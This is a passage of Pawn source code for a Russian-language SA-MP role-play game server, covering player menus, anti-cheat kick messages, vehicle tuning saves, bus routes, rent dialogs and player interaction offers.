	else format(house_text, sizeof house_text, "%d", GetPVarInt(playerid, "PlayerHouse"));

	format(fmt_info, sizeof fmt_info, "должность:_%s~n~бизнес:_%s~n~дом:_%s~n~кредитов:_%d", PI[playerid][pRank] == 0 ? ("Нет") : Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]],PI[playerid][pRank], text, house_text, PI[playerid][pCredits]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][16], fmt_info);

	format(fmt_info, sizeof fmt_info, "деньги:_%d", GetMoney(playerid));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][4], fmt_info);

	format(fmt_info, sizeof fmt_info, "уровень:_%d", PI[playerid][pLevel]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][5], fmt_info);

	if(PI[playerid][pAdmin]) text = "Администратор";
	else if(PI[playerid][pVip]) text = "VIP";
	else text = "Игрок";

	format(fmt_info, sizeof fmt_info, "статус:_%s~n~фишки:_%d~n~кредит:_%s", text, PhoneNumbers[playerid][0], PI[playerid][pCredit] == 1 ? ("есть") : ("нет"));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][17], fmt_info);

	format(fmt_info, sizeof fmt_info, "%s~n~%s~n~%s~n~%s~n~%s~n~%s",
	PhoneNumbers[playerid][2] == 1 ? ("~y~есть") : ("~g~нет"),
	g_player_skills[playerid][S_LICS][0] == 1 ? ("~y~есть") : ("~g~нет"),
	g_player_skills[playerid][S_LICS][2] == 1 ? ("~y~есть") : ("~g~нет"),
	g_player_skills[playerid][S_LICS][1] == 1 ? ("~y~есть") : ("~g~нет"),
	PhoneNumbers[playerid][2] == 1 ? ("~y~есть") : ("~g~нет"),
	g_player_skills[playerid][S_LICS][3] == 1 ? ("~y~есть") : ("~g~нет"));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][3], fmt_info);

	switch(PI[playerid][pSpawnChange])
	{
		case 0: format(text, sizeof text, "спавн");
		case 1: format(text, sizeof text, "дома");
		case 2: format(text, sizeof text, "орг.");
		case 3: format(text, sizeof text, "кварт.");
	}
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][6], text);

	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][7], GetPlayerSetting(playerid, 1));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][8], GetPlayerSetting(playerid, 7));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][9], GetPlayerSetting(playerid, 2));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][10], GetPlayerSetting(playerid, 0));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][11], GetPlayerSetting(playerid, 4));
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][12], GetPlayerSetting(playerid, 3));

	format(fmt_info, sizeof fmt_info, "%d%", g_player_skills[playerid][S_GUN][5]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][0], fmt_info);

	format(fmt_info, sizeof fmt_info, "%d%", g_player_skills[playerid][S_GUN][2]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][1], fmt_info);

	format(fmt_info, sizeof fmt_info, "%d%", g_player_skills[playerid][S_GUN][1]);
	PlayerTextDrawSetString(playerid, TDEditor_MENU_PLAYER[playerid][2], fmt_info);

	SelectTextDraw(playerid, 0x009900FF);

	for(new i; i < sizeof TDEditor_MENU_GLOBAL; i++) TextDrawShowForPlayer(playerid, TDEditor_MENU_GLOBAL[i]);
	for(new idx; idx < sizeof TDEditor_MENU_PLAYER; idx ++) PlayerTextDrawShow(playerid, TDEditor_MENU_PLAYER[playerid][idx]);

	return true;
}

stock ShowPlayerTuningMain(playerid)
{
	PI[playerid][P_TUNING_TYPE]	= 0;

	for(new idx; idx < 28; idx ++) TextDrawShowForPlayer(playerid, sto_td_global[idx]);
	for(new idx; idx < 3; idx ++) PlayerTextDrawShow(playerid, sto_td_player[idx][playerid]);

	SelectTextDraw(playerid, 0x33AA33FF);

	return 1;
}

stock ShowPlayerBuyVipNumberCar(playerid)
{
	return
		ShowPlayerDialog
		(
			playerid, DIALOG_BUY_VIP_NUMBER, DIALOG_STYLE_INPUT,
			"{ffcc00}Покупка VIP номеров",
			"{ffffff}- Номера должны быть в формате: {ffcc00}XYYYXX\n"\
			"{ffffff}(X - буква, Y - цифра, Y - цифра, Y - цифра, X - буква, X - буква)\n"\
			"{ffffff}В поле ниже введите желаемые номера:",
			"Купить", "Отмена"
		);
}
stock IsACarNumber(text[])
{
	new length = strlen(text);

	if(length != 6)
	{
		return 0;
	}

	for(new i; i < length; i ++)
	{
		switch(i)
		{
			case 0, 4, 5:
			{
				switch(text[i])
				{
					case 'A', 'B', 'C', 'E', 'H', 'K', 'M', 'O', 'P', 'T', 'X': continue;
					default: return 0;
				}
			}
			case 1..3:
			{
				switch(text[i])
				{
					case '0'..'9': continue;
					default: return 0;
				}
			}
		}
	}

	if(text[1] == text[2] && text[2] == text[3] && text[3] == '0')
	{
		return 0;
	}

	return 1;
}

stock getprocent(count,procent)
{
	new Float:proc =(count/100.0*procent);
	return floatround(proc,floatround_ceil);
}

forward CheckGrandAdmins(playerid);
public CheckGrandAdmins(playerid)
{
	new r, f;
	cache_get_data(r, f);

	cache_get_row(0, 1, player_grand_admin[0], dbHandle, 24);
	cache_get_row(0, 2, player_grand_admin[1], dbHandle, 24);
	cache_get_row(0, 3, player_grand_admin[2], dbHandle, 24);
	cache_get_row(0, 4, player_grand_admin[3], dbHandle, 24);
	cache_get_row(0, 5, player_grand_admin[4], dbHandle, 24);
	cache_get_row(0, 6, player_grand_admin[5], dbHandle, 24);
	cache_get_row(0, 7, player_grand_admin[6], dbHandle, 24);
	cache_get_row(0, 8, player_grand_admin[7], dbHandle, 24);
	cache_get_row(0, 9, player_grand_admin[8], dbHandle, 24);
	cache_get_row(0, 10, player_grand_admin[9], dbHandle, 24);

    STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "1) %s\n2) %s\n3) %s\n4) %s\n5) %s\n6) %s\n7) %s\n8) %s\n9) %s\n10) %s",
	player_grand_admin[0],player_grand_admin[1],player_grand_admin[2],player_grand_admin[3],player_grand_admin[4],
	player_grand_admin[5],player_grand_admin[6],player_grand_admin[7],player_grand_admin[8],player_grand_admin[9]);
	ShowPlayerDialog(playerid, D_SET_DEVELOPER, DIALOG_STYLE_LIST, "{E4A424}Администраторы c полным доступом:", STRING_GLOBAL, "Выбрать", "Выход");
	return true;
}

forward CheckPlayerFullAccess(playerid);
public CheckPlayerFullAccess(playerid)
{
	new r, f;
	cache_get_data(r, f);

 	cache_get_row(0, 1, player_fullaccess[0], dbHandle, 24);
	cache_get_row(0, 2, player_fullaccess[1], dbHandle, 24);
	cache_get_row(0, 3, player_fullaccess[2], dbHandle, 24);
	cache_get_row(0, 4, player_fullaccess[3], dbHandle, 24);
	cache_get_row(0, 5, player_fullaccess[4], dbHandle, 24);
	cache_get_row(0, 6, player_fullaccess[5], dbHandle, 24);
	cache_get_row(0, 7, player_fullaccess[6], dbHandle, 24);
	cache_get_row(0, 8, player_fullaccess[7], dbHandle, 24);
	cache_get_row(0, 9, player_fullaccess[8], dbHandle, 24);
	cache_get_row(0, 10, player_fullaccess[9], dbHandle, 24);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "1) %s\n2) %s\n3) %s\n4) %s\n5) %s\n6) %s\n7) %s\n8) %s\n9) %s\n10) %s",
	player_fullaccess[0],player_fullaccess[1],player_fullaccess[2],player_fullaccess[3],player_fullaccess[4],
	player_fullaccess[5],player_fullaccess[6],player_fullaccess[7],player_fullaccess[8],player_fullaccess[9]);
	ShowPlayerDialog(playerid, D_ALLFULLACCESS, DIALOG_STYLE_LIST, "{E4A424}Администраторы c полным доступом:", STRING_GLOBAL, "Выбрать", "Выход");
}

forward CallAntiCheat(targetid, const cheat_name[], cheat_code);
public CallAntiCheat(targetid, const cheat_name[], cheat_code)
{
	if(GetPVarInt(targetid, "FIX_FLOOD") > gettime()) return 1;

	new fmt_msg[144], PLAYER_NAME[MAX_PLAYER_NAME];
	GetPlayerName(targetid, PLAYER_NAME, sizeof(PLAYER_NAME));

	if(cheat_code == 82 || cheat_code == 84 || cheat_code == 85)
	{
		format(fmt_msg, sizeof fmt_msg, "Вы были кикнуты по подозрению в читерстве! (Код: %s)", cheat_name);
		SendClientMessage(targetid, COLOR_RED, fmt_msg);

		format(fmt_msg, sizeof fmt_msg, "{E3E3E3}<{FF9900}Анти-Чит{E3E3E3}>{E3E3E3}%s (ID: %d) был кикнут за использование читов {FF9900}%s <#%d>", PLAYER_NAME, targetid, cheat_name, cheat_code);
		SendAdminMessage(0xFFFFFFFF, fmt_msg);

		SetTimerEx("DisconnectPlayer",500,0,"i", targetid);
	}
	else
	{
		format(fmt_msg, sizeof fmt_msg, "{E3E3E3}<{FF9900}Анти-Чит{E3E3E3}>{E3E3E3}%s (ID: %d) возможно использует {FF9900}%s <#%d>", PLAYER_NAME, targetid, cheat_name, cheat_code);
		SendAdminMessage(0xFFFFFFFF, fmt_msg);
	}

	SetPVarInt(targetid, "FIX_FLOOD", gettime() + 5);
	return 1;
}

forward StartBall();
public StartBall()
{
	MoveDynamicObject(g_arend_ball_object, 488.3500, 1746.0500, 58.9357, 5.0);
	return 1;
}

forward StopBall();
public StopBall()
{
	MoveDynamicObject(g_arend_ball_object, 2703.3855, -1490.9417, 58.9357, 5.0);
	return 1;
}

public OnDynamicObjectMoved(objectid)
{
	new
		Float: x,
		Float: y,
		Float: z;

	GetDynamicObjectPos(objectid, x, y, z);

	if(g_arend_ball_status == true)
	{
		if(x == 488.3500 && y == 1746.0500 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 487.9333, 1012.3615, 58.9357, 5.0);
		}

		if(x == 487.9333 && y == 1012.3615 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 2512.5151, -226.8732, 58.9357, 5.0);
		}

		if(x == 2512.5151 && y == -226.8732 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 2672.2507, -1795.8337, 58.9357, 5.0);
		}

		if(x == 2672.2507 && y == -1795.8337 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 2231.3931, -1896.2926, 58.9357, 5.0);
		}

		if(x == 2231.3931 && y == -1896.2926 && z == 58.9357)
		{
			SetTimer("StopBall", 20_000, false);
		}

		if(x == 2703.3855 && y == -1490.9417 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 2660.5171, -1021.9949, 58.9357, 5.0);
		}

		if(x == 2660.5171 && y == -1021.9949 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 1873.2141, -219.1623, 58.9357, 5.0);
		}

		if(x == 1873.2141 && y == -219.1623 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 960.3962, -236.7252, 58.9357, 5.0);
		}

		if(x == 960.3962 && y == -236.7252 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 914.9163, 1684.6279, 58.9357, 5.0);
		}

		if(x == 914.9163 && y == 1684.6279 && z == 58.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 488.3500, 1746.0500, 57.9357, 5.0);
		}

		if(x == 488.3500 && y == 1746.0500 && z == 57.9357)
		{
			MoveDynamicObject(g_arend_ball_object, 488.3500, 1746.0500, 11.0000, 5.0);
		}

		if(x == 488.3500 && y == 1746.0500 && z == 11.0000)
		{
			g_arend_ball_status = false;
		}
	}

	return 1;
}

stock AntiSKick(playerid, type, reason[])
{
	new fmt_msg[128];

	new Hour, Minute, Second, Year, Month, Day;

	gettime(Hour, Minute, Second);
	getdate(Year, Month, Day);

	format(fmt_msg, sizeof fmt_msg, "{AFAFAF}[{FF6600}Анти-Чит{AFAFAF}] %s (ID:%d) кикнут <#%d> [%s]", GetName(playerid), playerid, type, reason);
	SendAdminMessage(0xFF6600FF, fmt_msg);

	format(fmt_msg, sizeof fmt_msg, "{ff6600}RAC | {ffcc00}Вы были кикнуты по подозрению в читерстве! (Код:%d)", type);
	SendClientMessage(playerid, -1, fmt_msg);

	format(fmt_msg, sizeof fmt_msg, "{ff6600}RAC | {ffcc00}Дата и время: %02d:%02d:%02d %02d:%02d:%02d / Пинг: %d", Year, Month, Day, Hour, Minute, Second, GetPlayerPing(playerid));
	SendClientMessage(playerid, -1, fmt_msg);

	return KickEx(playerid, "AntiSKick");
}

/*stock SavePresents(playerid)
{
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"UPDATE accounts SET presents='%d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d, %d' WHERE name='%s'",
		PI[playerid][pPresent][0], PI[playerid][pPresent][1], PI[playerid][pPresent][2], PI[playerid][pPresent][3], PI[playerid][pPresent][4], PI[playerid][pPresent][5], PI[playerid][pPresent][6],
		PI[playerid][pPresent][7], PI[playerid][pPresent][8], PI[playerid][pPresent][9], PI[playerid][pPresent][10], PI[playerid][pPresent][11], PI[playerid][pPresent][12], PI[playerid][pPresent][13],
		PI[playerid][pPresent][14], PI[playerid][pPresent][15], PI[playerid][pPresent][16], PI[playerid][pPresent][17], PI[playerid][pPresent][18], PI[playerid][pPresent][19], PI[playerid][pPresent][20],
		PI[playerid][pPresent][21], PI[playerid][pPresent][22], PI[playerid][pPresent][23], PI[playerid][pPresent][24], PI[playerid][pPresent][25], PI[playerid][pPresent][26], PI[playerid][pPresent][27],
		PI[playerid][pPresent][28], PI[playerid][pPresent][29], PI[playerid][pPresent][30], PI[playerid][pPresent][31], PI[playerid][pPresent][32], PI[playerid][pPresent][33], PI[playerid][pPresent][34],
		PI[playerid][pPresent][35], PI[playerid][pPresent][36], PI[playerid][pPresent][37], PI[playerid][pPresent][38], PI[playerid][pPresent][39], PI[playerid][pPresent][40], GetName(playerid));

	mysql_query(dbHandle, STRING_GLOBAL);

	return 1;
}*/

/*forward SendMessageRelocation();
public SendMessageRelocation()
{
	SendClientMessageToAll(C_OSNOV, "[Strix INFO] УВАЖАЕМЫЕ ИГРОКИ Strix ROLE PLAY");
	SendClientMessageToAll(C_OSNOV, "[Strix INFO] 25.01.2018 (ЧЕТВЕРГ) Strix ROLE PLAY ПЕРЕЕЗЖАЕТ НА НОВЫЙ IP");
	SendClientMessageToAll(C_OSNOV, "[Strix INFO] ВСЯ ПОДРОБНАЯ ИНФОРМАЦИЯ В ГРУППЕ ВК: vk.com/Dushevniy_crmp");
	return 1;
}*/

stock RemovePlayerWeapon(playerid, b_weapon)
{
	new b_weaponammo[13][2];
	for(new s; s != 13; s++) GetPlayerWeaponData(playerid, s, b_weaponammo[s][0], b_weaponammo[s][1]);
	ResetPlayerWeapons(playerid);
	for(new g; g != 13; g++)
	{
		if(b_weaponammo[g][0] == b_weapon || b_weaponammo[g][1] <= 0) continue;
		GivePlayerWeapon(playerid, b_weaponammo[g][0], b_weaponammo[g][1]);
		break;
	}
}

stock SaveVehicleTuning(playerid)
{
	new vehicleid = GetPlayerVehicleID(playerid);

	g_vehicle[vehicleid][veh_coms][0] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_SPOILER);
	g_vehicle[vehicleid][veh_coms][1] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_HOOD);
	g_vehicle[vehicleid][veh_coms][2] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_ROOF);
	g_vehicle[vehicleid][veh_coms][3] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_SIDESKIRT);
	g_vehicle[vehicleid][veh_coms][4] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_LAMPS);
	g_vehicle[vehicleid][veh_coms][5] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_NITRO);
	g_vehicle[vehicleid][veh_coms][6] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_EXHAUST);
	g_vehicle[vehicleid][veh_coms][7] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_WHEELS);
	g_vehicle[vehicleid][veh_coms][8] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_STEREO);
	g_vehicle[vehicleid][veh_coms][9] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_HYDRAULICS);
	g_vehicle[vehicleid][veh_coms][10] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_FRONT_BUMPER);
	g_vehicle[vehicleid][veh_coms][11] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_REAR_BUMPER);
	g_vehicle[vehicleid][veh_coms][12] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_VENT_RIGHT);
	g_vehicle[vehicleid][veh_coms][13] = GetVehicleComponentInSlot(vehicleid, CARMODTYPE_VENT_LEFT);
	format(g_vehicle[vehicleid][veh_com], 64, "%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d,%d",
	g_vehicle[vehicleid][veh_coms][0], g_vehicle[vehicleid][veh_coms][1], g_vehicle[vehicleid][veh_coms][2],
	g_vehicle[vehicleid][veh_coms][3], g_vehicle[vehicleid][veh_coms][4], g_vehicle[vehicleid][veh_coms][5],
	g_vehicle[vehicleid][veh_coms][6], g_vehicle[vehicleid][veh_coms][7], g_vehicle[vehicleid][veh_coms][8],
	g_vehicle[vehicleid][veh_coms][9], g_vehicle[vehicleid][veh_coms][10], g_vehicle[vehicleid][veh_coms][11],
	g_vehicle[vehicleid][veh_coms][12], g_vehicle[vehicleid][veh_coms][13]);

	new fmt_query[130];

	format(fmt_query, sizeof fmt_query, "UPDATE ownable_cars SET veh_com='%s', paintjob=%d WHERE id=%d", g_vehicle[vehicleid][veh_com], g_vehicle[vehicleid][veh_paintjob], g_vehicle[vehicleid][veh_sql_id]);
	mysql_query(dbHandle, fmt_query);

	return 1;
}

/*stock GetPlayerSubnet(playerid, buffer[], size=sizeof(buffer)) // by Daniel_Cortez \\ pro-pawn.ru
{
    GetPlayerIp(playerid, buffer, size);
    for(new i=0,dots=0; ; ++i)
        switch(buffer[i])
        {
            case '\0':
                break;
            case '.':
                if(++dots == 2)
                {
                    buffer[i] = '\0';
                    break;
                }
        }
}*/

stock GetIpSubnet(buffer[]) // by Daniel_Cortez, modified by TheMallard \\ pro-pawn.ru
{
    for(new i=0,dots=0; ; ++i)
        switch(buffer[i])
        {
            case '\0':
                break;
            case '.':
                if(++dots == 2)
                {
                    buffer[i] = '\0';
                    break;
                }
        }
}

stock ShowPlayerDialogRoute(playerid)
{
	new route = GetPVarInt(playerid, "bus_route")-1, id_bus = PI[playerid][pBusID], route_name[32];

	switch(route)
	{
		case 0: format(route_name, sizeof route_name, "%s", g_bus[id_bus][route_one]);
		case 1: format(route_name, sizeof route_name, "%s", g_bus[id_bus][route_two]);
		case 2: format(route_name, sizeof route_name, "%s", g_bus[id_bus][route_three]);
	}

	if(route != -1 && id_bus != -1)
	{
		new Float: X, Float: Y, Float: Z, Float: SetX, Float: SetY, Float: SetZ;
		GetPlayerPos(playerid, X, Y, Z);

		new fmt_msg[290];

		switch(route)
		{
			case 0:
			{
				SetX = g_bus[id_bus][next_stop_one][0];
				SetY = g_bus[id_bus][next_stop_one][1];
				SetZ = g_bus[id_bus][next_stop_one][2];
			}
			case 1:
			{
				SetX = g_bus[id_bus][next_stop_two][0];
				SetY = g_bus[id_bus][next_stop_two][1];
				SetZ = g_bus[id_bus][next_stop_two][2];
			}
			case 2:
			{
				SetX = g_bus[id_bus][next_stop_three][0];
				SetY = g_bus[id_bus][next_stop_three][1];
				SetZ = g_bus[id_bus][next_stop_three][2];
			}
		}

		format
		(
			fmt_msg, sizeof fmt_msg,
			"{ffffff}Вы выбрали маршрут, в который хотите отправиться:\n\n"\
			"{ffffff}Маршрут: {ffcc00}%s\n"\
			"{ffffff}Расстояние до остановки: {ffcc00}%.1f м\n"\
			"{ffffff}Цена билета: {ffcc00}200 рублей\n"\
			"{ffffff}Время поездки: {ffcc00}%s мин\n\n"\
			"{ffffff}Вы согласны на проезд?",
			route_name,
			GetDistanceBetweenPoints(X, Y, Z, SetX, SetY, SetZ),
			Converts(g_bus[id_bus][bus_time_minute])
		);

		ShowPlayerDialog
		(
			playerid, DIALOG_ROUTE_BUS, DIALOG_STYLE_MSGBOX,
			"{ffcc00}Информация о проезде",
			fmt_msg,
			"Далее", "Отмена"
		);
	}
}

forward PlayerBusTimer(playerid);
public PlayerBusTimer(playerid)
{
	if(PI[playerid][pBusTimer] > 0)
	{
		PI[playerid][pBusTimer] --;

		new fmt_msg[20];

		format(fmt_msg, sizeof fmt_msg, "0%s", Converts(PI[playerid][pBusTimer]));

		PlayerTextDrawSetString(playerid, bus_time[1][playerid], fmt_msg);
	}
	else
	{
		KillTimer(player_bus_timer[playerid]);
		player_bus_timer[playerid] = -1;

		for(new i = 0; i < sizeof bus_time; i ++) PlayerTextDrawHide(playerid, bus_time[i][playerid]);

		SetPlayerPosInStopRoute(playerid);

	}
	return 1;
}

stock SetPlayerPosInBus(playerid)
{
	new r = random(4);

	FreezePlayer(playerid, 5000);
	SetPlayerPos(playerid, coord_spawn_bus_int[r][0], coord_spawn_bus_int[r][1], coord_spawn_bus_int[r][2]);
	SetPlayerFacingAngle(playerid, 270.0);

	new route = GetPVarInt(playerid, "bus_route")-1;

	SetPlayerInterior(playerid, 1);
	SetPlayerVirtualWorld(playerid, route);

	CancelSelectTextDraw(playerid);
}

stock SetPlayerPosInStopRoute(playerid)
{
	new route = GetPVarInt(playerid, "bus_route")-1, id_bus = PI[playerid][pBusID];

	switch(route)
	{
		case 0:
		{
			SetPlayerPos(playerid, g_bus[id_bus][next_stop_one][0], g_bus[id_bus][next_stop_one][1], g_bus[id_bus][next_stop_one][2]);
			SetPlayerFacingAngle(playerid, g_bus[id_bus][next_stop_one][3]);
		}
		case 1:
		{
			SetPlayerPos(playerid, g_bus[id_bus][next_stop_two][0], g_bus[id_bus][next_stop_two][1], g_bus[id_bus][next_stop_two][2]);
			SetPlayerFacingAngle(playerid, g_bus[id_bus][next_stop_two][3]);
		}
		case 2:
		{
			SetPlayerPos(playerid, g_bus[id_bus][next_stop_three][0], g_bus[id_bus][next_stop_three][1], g_bus[id_bus][next_stop_three][2]);
			SetPlayerFacingAngle(playerid, g_bus[id_bus][next_stop_three][3]);
		}
	}

	DeletePVar(playerid, "bus_route");
	DeletePVar(playerid, "stop_bus");

	PI[playerid][pBusTimer] =
	PI[playerid][pBusID] = -1;

	SendClientMessage(playerid, C_OSNOV, "Вы успешно прибыли на остановку");

	SetPlayerInterior(playerid, 0);
	SetPlayerVirtualWorld(playerid, 0);

	for(new i = 0; i < sizeof bus; i ++) PlayerTextDrawHide(playerid, bus[i][playerid]);

	return 1;
}

stock ShowPlayerDialogPayHouse(playerid, houseid)
{
	if(houseid == -1)
		return 1;

	new fmt_dialog[170];

	format
	(
		fmt_dialog, sizeof fmt_dialog,
		"{ffffff}Дом:\t\t\t\t\t№%d\n"\
		"Оплаченных дней арендны:\t\t\t%d из 10\n"\
		"Ежедневная плата:\t\t%d руб\n"\
		"На сколько дней Вы хотите оплатить дом?",
		houseid,
		HouseInfo[houseid][hOplata],
		GetHomeOplata(houseid)
	);

	return ShowPlayerDialog(playerid, DIALOG_PAY_HOUSE, DIALOG_STYLE_INPUT, "{ffcc00}Оплата проживания в доме", fmt_dialog, "Оплатить", "Назад");
}

stock ShowPlayerDialogPayBusiness(playerid, businessid)
{
	if(businessid == -1)
		return 1;

	new fmt_dialog[170];

	format
	(
		fmt_dialog, sizeof fmt_dialog,
		"{ffffff}Бизнес:\t\t\t\t\t№%d\n"\
		"Оплаченных дней арендны:\t\t\t%d из 30\n"\
		"Ежедневная плата:\t\t\t\t%d руб\n"\
		"На сколько дней Вы хотите оплатить бизнес?",
		businessid,
		BizzInfo[businessid][bOplata],
		GetBizOplata(businessid)
	);

	return ShowPlayerDialog(playerid, DIALOG_PAY_BUSINESS, DIALOG_STYLE_INPUT, "{ffcc00}Оплата проживания в доме", fmt_dialog, "Оплатить", "Назад");
}

stock SendPlayerProposition(playerid, to_player, type, value_1 = 0, value_2 = 0)
{
	if(proposition_info[playerid][P_OUT_ID] == INVALID_PLAYER_ID && to_player != INVALID_PLAYER_ID)
	{
		new fmt_str[144];
		switch(type)
		{
			case PROPOSITION_TYPE_KISS:
			{
				if(PI[playerid][pInteractionPlayer] == INVALID_PLAYER_ID)
					return SendClientMessage(playerid, C_RED, "Игрок вышел");

				format(fmt_str, sizeof fmt_str, "Игрок %s хочет Вас поцеловать", GetName(playerid));
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s поцеловать Вас", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);

			}
			case PROPOSITION_TYPE_HUG:
			{
				if(PI[playerid][pInteractionPlayer] == INVALID_PLAYER_ID)
					return SendClientMessage(playerid, C_RED, "Игрок вышел");

				format(fmt_str, sizeof fmt_str, "Игрок %s хочет Вас обнять", GetName(playerid));
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s обнять Вас", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_HI:
			{
				if(PI[playerid][pInteractionPlayer] == INVALID_PLAYER_ID)
					return SendClientMessage(playerid, C_RED, "Игрок вышел");

				format(fmt_str, sizeof fmt_str, "Игрок %s хочет пожать Вам руку", GetName(playerid));
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s пожать Вам руку", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_SELL_CAR:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s хочет продать Вам свой транспорт %s (%d) для %d слота за %d рублей", GetName(playerid), g_vehicle_info[GetVehicleModel(g_player_car[playerid]) - 400][VI_NAME], GetVehicleModel(g_player_car[playerid]), GetVehicleData(g_player_car[playerid], veh_slot), value_1);
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);
				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s купить Ваш транспорт %s (%d)", GetName(to_player), g_vehicle_info[GetVehicleModel(g_player_car[playerid]) - 400][VI_NAME], GetVehicleModel(g_player_car[playerid]));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_SELL_HOUSE:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s хочет продать Вам свой дом №%d за %d рублей", GetName(playerid), GetPlayerHouse(playerid), value_1);
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s купить свой дом №%d за %d рублей", GetName(to_player), GetPlayerHouse(playerid), value_1);
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_SELL_BUSINESS:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s хочет продать Вам свой бизнес №%d (%s) за %d рублей", GetName(playerid), GetPlayerBizz(playerid), BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bName], value_1);
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s купить свой бизнес №%d (%s) за %d рублей", GetName(to_player), GetPlayerBizz(playerid), BizzInfo[GetPVarInt(playerid, "PlayerBizz")][bName], value_1);
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_SHOW_LIC:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s хочет показать Вам свои лицензии", GetName(playerid));
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s просмотреть свои лицензии", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_SHOW_PASS:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s хочет показать Вам свой паспорт", GetName(playerid));
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s посмотреть свой паспорт", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_INVITE:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s хочет показать Вам свой паспорт", GetName(playerid));
				SendClientMessage(to_player, 0x3399FFFF, fmt_str);

				SendMess(to_player, MSG_PLAYER_ACCESS);

				format(fmt_str, sizeof fmt_str, "Вы предложили %s посмотреть свой паспорт", GetName(to_player));
				SendClientMessage(playerid, 0x3399FFFF, fmt_str);
			}
			case PROPOSITION_TYPE_FAMILY_INVITE:
			{
				format(fmt_str, sizeof fmt_str, "Игрок %s предлагает Вам вступить в семью {ffcc00}\"%s\"", GetName(playerid), GetFamilyData(PI[playerid][P_FAMILY]-1, F_NAME));
